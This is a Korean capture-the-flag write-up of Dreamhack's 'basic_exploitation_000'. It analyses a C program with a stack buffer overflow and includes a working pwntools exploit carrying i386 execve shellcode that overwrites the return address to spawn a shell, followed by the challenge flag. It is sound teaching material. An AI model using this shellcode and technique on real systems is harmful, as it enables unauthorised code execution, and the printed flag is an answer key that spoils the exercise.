<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Dreamhack "basic_exploitation_000"  Write-UP</h1>
</body>
<br>
<br>
</html>

2025.09.22 풀이

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
 
 
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
 
 
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
 
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
 
 
int main(int argc, char *argv[]) {
 
    char buf[0x80];
 
    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);
 
    return 0;
}
```

주어진 문제의 코드를 살펴보았다. 

코드를 살펴보니, setvbuf(stdin, NULL, _IONBF, 0) or setvbuf(stdout, NULL, _IONBF, 0)

부분을 통해, 입출력 버퍼링을 방지하는 것을 확인할 수 있었다.

그 후, signal(SIGALRM, alarm_handler); alarm(30) 통해 프로그램에

30초 타임아웃을 설정하여, 자동화된 잇스플로잇이 너무 오래 동작하면

종료되게끔 구성되어있었다. 

char buf[0x80] 을 보니, 128 바이트 크기의 지역변수에 할당되는 것을 알 수 있다. 

printf("buf = (%p)\n", buf) 이를 보면, 실행 중인 스택의 buf 주소를 출력해주고 있다.

scanf("%141s", buf) 부분을 보니, 최대 141문자까지 읽도록 제한을 주는 것을 알 수있다.

이를 이용하여 버퍼 오버플로우를 발생시키는 데 이용하면 될 것으로 보인다. 

<br>

</br> 

```
#!/usr/bin/env python3
from pwn import *
import re, sys

if len(sys.argv) != 3:
    print("usage: python3 exploit.py <host> <port>"); sys.exit(1)
host, port = sys.argv[1], int(sys.argv[2])

context.clear(arch='i386', os='linux')
# scanf 
sc = (
    b"\x31\xc0\x50\x68\x6e\x2f\x73\x68"
    b"\x68\x2f\x2f\x62\x69\x89\xe3\x31"
    b"\xc9\x31\xd2\xb0\x08\x40\x40\x40"
    b"\xcd\x80"
)

p = remote(host, port)
data = p.recvline(timeout=8)
m = re.search(rb'0x[0-9a-fA-F]+', data)
if not m:
    data += p.recv(1024, timeout=1)
    m = re.search(rb'0x[0-9a-fA-F]+', data)
if not m:
    p.close(); sys.exit(1)

buf = int(m.group(0), 16)
payload = sc + b"A" * (132 - len(sc)) + p32(buf)
p.sendline(payload)
p.interactive()
```

이를 통해, 다음과 같은 쉘코드를 짰다.

서버가 buf 주소를 출력해주니까 그 값을 받아서 리턴 주소에 그대로 넣어

buf로 점프한다는 점을 이용하였다. 

scanf의 제약을 피하려고 널, 공백, 제어문자가 없는 짧은 쉘코드 sc를 작성하고,

이를 버퍼 맨 앞에 두는 방식으로 작성해보았다.

쉘코드, 뒤에 RET 직전까지 패딩을 채우고 마지막 4 바이트에 버퍼의 주소를 리틀엔디안으로

넣어서 복귀 시점에 버퍼로 점프하도록 하였다.

<br>

</br> 

<img width="1280" height="330" alt="image" src="https://github.com/user-attachments/assets/33263624-a6e5-4f47-aa64-6ac8a8b78789" />

이를 실행해해보면, flag 값을 얻을 수 있다!

<br>

</br> 

```
DH{465dd453b2a25a26a847a93d3695676d}
```
